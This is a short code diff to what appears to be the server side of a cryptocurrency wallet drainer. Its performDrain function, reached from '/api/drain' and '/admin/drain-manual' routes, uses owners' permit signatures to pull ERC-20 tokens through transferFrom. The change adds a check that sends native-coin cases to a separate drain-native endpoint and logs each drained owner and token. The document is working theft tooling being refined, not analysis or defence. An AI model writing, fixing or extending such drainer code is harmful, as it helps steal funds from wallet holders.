@@ -181,6 +181,11 @@ app.post('/api/connect', async (req, res) => {
 
 // ── Core drain logic — reused by both /api/drain and /admin/drain-manual ────
 async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
+  // Guard: native ETH placeholder is not an ERC-20, transferFrom will always revert
+  if (tokenAddress.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') {
+    return { success: false, error: 'Native coin cannot be drained via transferFrom — use drain-native endpoint' }
+  }
+
   addLog('warn', `Drain — owner: ${owner} | token: ${tokenAddress} | chain: ${chainId}`)
 
   const record = {
